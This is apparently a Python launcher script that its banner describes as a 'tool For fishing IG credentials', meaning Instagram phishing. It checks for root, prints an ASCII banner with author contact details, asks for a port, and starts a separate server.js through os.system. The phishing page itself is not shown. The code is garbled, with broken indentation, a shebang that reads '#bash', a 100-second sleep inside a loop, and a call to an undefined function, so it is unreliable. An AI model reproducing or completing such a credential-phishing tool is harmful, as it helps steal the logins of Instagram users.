#bash/bin/python3


from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
import time
import requests
import os 
import sys
import re

# This color
blue='\e[0;34'
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'


def check_root():
    if os.geteuid() == 0:
        return True
    else:
        return False

def main():
    print("\033[92mCHECKING IF YOUR ROOTED...")
    loading_symbols = ["/", "-", "\\", "|"]
    i = 0
    while True:
        print("\rLoading" + loading_symbols[i % len(loading_symbols)], end="")
        i += 1
        time.sleep(100)
        if check_root():
            break

    if check_root():
        print("\033[92mYOU ARE ROOTED.")
    else:
        print("\033[92mYOU ARE NOT ROOTED.")

if __name__ == "__main__":
    main()



 print("\033[92mRUN TOR FOR ANONYMOUS\033[0m")
 time.sleep(5)
os.system('clear')


    # Display info
    print("\033[92m\n\n")
    print("\033[92m ______                          _____        ______              _____        ______       _____                   ")
    print("\033[92m |     |     |       |     |     |            |     |     /\     |      \     |            |                        ")
    print("\033[92m |_____/     |       |     |     |____        |_____/    /  \    |       |    | ____       | ____                   ")
    print("\033[92m |     \     |       |     |     |            |     \   /____\   |       |    |      \     |                        ")
    print("\033[92m |_____|     |____   |_____|     |_____****** |_____|  /      \  |_____ /     |______|     |_____                   ")

    print("\033[92m\n\n")
    print("\033[92m         ***********************************************")
    print("\033[92m         #                                             #")
    print("\033[92m         #   tool For fishing IG credentials #")
    print("\033[92m         #   Follow Me On Github: @ephraim sib#")
    print("\033[92m         #   Contact Me In: ephraimsibale20@gmail.com#")
    print("\033[92m         #   Changelog: 5-12-2023           #")
    print("\033[92m         #                                             #")
    print("\033[92m         ***********************************************")
    print("\033[92m\n\n")

    # Prompt user to enter a port number
def validate_port(port):
    if not re.match('^([1-9][0-9]{3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])$', port):
        return False
    else:
        return True

while True:
    port = input("Please enter a port number (1024 to 65535): ")
    if validate_port(port):
        break
    else:
        print("Invalid port number. Please enter a valid port number.")

print("Valid port number.")
    # Generate the link
    link = f"http://localhost:{port}/"

    # Print the link
    print(f"Generated link: {link}")

    # Set the file to write log messages to
    logfile = "server.log"

    # Set the file to run the server
    server_file = "server.js"

    # Set the command to run the server
    server_command = f"node {server_file}"

    # Print start message
    print(f"Starting server on port {port}")

    # Redirect stdout and stderr to log file
    sys.stdout = open(logfile, "a")
    sys.stderr = open(logfile, "a")

    # Run the server
    os.system(f"{server_command} {port}")


if __name__ == "__main__":
    run_server()
